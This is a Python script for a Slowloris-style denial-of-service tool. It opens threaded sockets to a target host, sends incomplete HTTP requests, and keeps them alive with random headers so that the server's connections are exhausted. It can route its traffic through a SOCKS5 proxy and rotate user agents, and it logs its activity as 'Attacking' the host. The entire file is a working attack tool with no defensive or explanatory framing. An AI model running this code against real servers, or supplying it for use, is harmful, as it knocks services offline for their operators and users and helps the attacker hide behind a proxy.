#!/usr/bin/env python3
import argument
import agents

import logging
import threading
import random
import socket
import sys
import time

args = argument.parser.parse_args()

if len(sys.argv) <= 1:
    argument.parser.print_help()
    sys.exit(1)

if not args.host:
    print("Host required!")
    argument.parser.print_help()
    sys.exit(1)

if args.useproxy:
    # Tries to import to external "socks" library
    # and monkey patches socket.socket to connect over
    # the proxy by default
    try:
        import socks

        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port)
        socket.socket = socks.socksocket
        logging.info("Using SOCKS5 proxy for connecting...")
    except ImportError:
        logging.error("Socks Proxy Library Not Available!")

if args.verbose:
    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.DEBUG,
    )
else:
    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.INFO,
    )

if args.https:
    logging.info("Importing ssl module")
    import ssl

list_of_sockets = []
user_agents = agents.user_agents


def init_socket(ip, method, uri, payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    if args.https:
        s = ssl.wrap_socket(s)

    s.connect((ip, args.port))

    if method == 'GET':
        s.send("GET {}?{} HTTP/1.1\r\n".format(uri, payload).encode("utf-8"))
    elif method == 'POST':
        s.send("POST {} HTTP/1.1\r\n".format(uri).encode("utf-8"))
    else:
        logging.info("Don't support this method {}".format(method))
        return None
    
    if args.randuseragent:
        s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
    else:
        s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
        s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    
    return s


def slowcc(ip, method, uri, payload):
    try:
        s = init_socket(ip, method, uri, payload)
        list_of_sockets.append(s)

        while True:
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            except socket.error:
                list_of_sockets.remove(s)
                break

            time.sleep(args.sleeptime)

    except socket.error as e:
        logging.debug(e)


def main():
    ip = args.host
    socket_count = args.sockets
    logging.info("Attacking %s with %s sockets.", ip, socket_count)
    
    while True:
        try:
            logging.info("Creating socket...")
            for _ in range(socket_count - len(list_of_sockets)):
                mythread = threading.Thread(target=slowcc, args=(ip, args.method, args.uri , args.payload, )) 
                mythread.start()

        except (KeyboardInterrupt, SystemExit):
            logging.info("Stopping Slowloris")
            break

        time.sleep(args.sleeptime)
        logging.info("Sending keep-alive headers... Socket count: %s", len(list_of_sockets))
        

if __name__ == "__main__":
    main()